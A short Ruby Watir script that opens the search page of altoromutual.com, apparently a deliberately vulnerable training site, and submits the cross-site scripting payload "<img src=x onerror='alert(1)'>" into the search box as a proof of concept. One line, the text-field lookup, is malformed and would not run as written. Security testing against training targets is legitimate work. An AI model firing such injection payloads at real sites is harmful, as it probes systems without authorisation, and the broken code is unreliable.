#!/usr/bin/env ruby

require 'watir'

browser = Watir::Browser.new :chrome
browser.goto "http://altoromutual.com/search.aspx?"
browser.text_fieldname(name :txtSearch).set("<img src=x onerror='alert(1)'>")
btn = browser.button(value: 'Go')
puts btn.exists?
btn.click

#browser.close
